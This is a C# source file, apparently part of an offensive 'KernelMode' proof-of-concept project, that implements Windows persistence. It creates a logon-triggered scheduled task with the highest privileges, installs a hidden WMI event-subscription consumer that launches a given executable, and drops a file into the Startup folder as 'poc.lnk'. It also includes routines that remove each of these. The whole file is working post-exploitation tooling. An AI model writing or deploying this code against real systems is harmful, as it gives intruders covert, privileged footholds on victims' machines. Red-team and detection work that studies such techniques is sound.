// File: Utils/Persistence.cs
// Project: KernelMode

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace KernelMode.Utils
{
	public static class Persistence
	{
		public static void AddScheduledTask(string exePath, string taskName = "KernelModeTask")
		{
			Console.WriteLine("[*] Adding scheduled task persistence...");
			string args = $"/Create /F /RL HIGHEST /SC ONLOGON /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\"";
			Execute("schtasks.exe", args);
		}

		public static void RemoveScheduledTask(string taskName = "KernelModeTask")
		{
			Console.WriteLine("[*] Removing scheduled task persistence...");
			string args = $"/Delete /F /TN \"{taskName}\"";
			Execute("schtasks.exe", args);
		}

		public static void AddWmiPersistence(string exePath, string filterName = "KernelModeFilter")
		{
			Console.WriteLine("[*] Adding WMI event subscription persistence...");

			try
			{
				var scope = new ManagementScope(@"\\.\root\subscription");
				scope.Connect();

				var query = new WqlEventQuery("__InstanceModificationEvent", "TargetInstance ISA 'Win32_ComputerSystem'");
				var filter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null).CreateInstance();
				filter["Name"] = filterName;
				filter["Query"] = query.QueryString;
				filter["QueryLanguage"] = "WQL";
				filter["EventNamespace"] = "root\\cimv2";
				filter.Put();

				var consumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
				consumer["Name"] = filterName;
				consumer["CommandLineTemplate"] = exePath;
				consumer.Put();

				var binder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
				binder["Filter"] = filter.Path.RelativePath;
				binder["Consumer"] = consumer.Path.RelativePath;
				binder.Put();

				Console.WriteLine("[+] WMI persistence added.");
			}
			catch (Exception ex)
			{
				Console.WriteLine("[-] Failed to add WMI persistence: " + ex.Message);
			}
		}

		public static void RemoveWmiPersistence(string filterName = "KernelModeFilter")
		{
			Console.WriteLine("[*] Removing WMI persistence...");

			try
			{
				string[] classes = { "__EventFilter", "CommandLineEventConsumer", "__FilterToConsumerBinding" };
				foreach (string cls in classes)
				{
					var query = $"SELECT * FROM {cls} WHERE Name = '{filterName}'";
					var searcher = new ManagementObjectSearcher(@"\\.\root\subscription", query);
					foreach (ManagementObject obj in searcher.Get())
					{
						obj.Delete();
					}
				}

				Console.WriteLine("[+] WMI persistence removed.");
			}
			catch (Exception ex)
			{
				Console.WriteLine("[-] Failed to remove WMI persistence: " + ex.Message);
			}
		}

		private static void Execute(string file, string args)
		{
			var startInfo = new ProcessStartInfo
			{
				FileName = file,
				Arguments = args,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				CreateNoWindow = true
			};

			using (var process = Process.Start(startInfo))
			{
				process.WaitForExit();
			}
		}
		public static void Add(string path)
		{
			string startup = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "poc.lnk");
			File.Copy(path, startup, true);
		}

		public static void Remove()
		{
			string startup = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "poc.lnk");
			if (File.Exists(startup))
				File.Delete(startup);
		}
	}
}
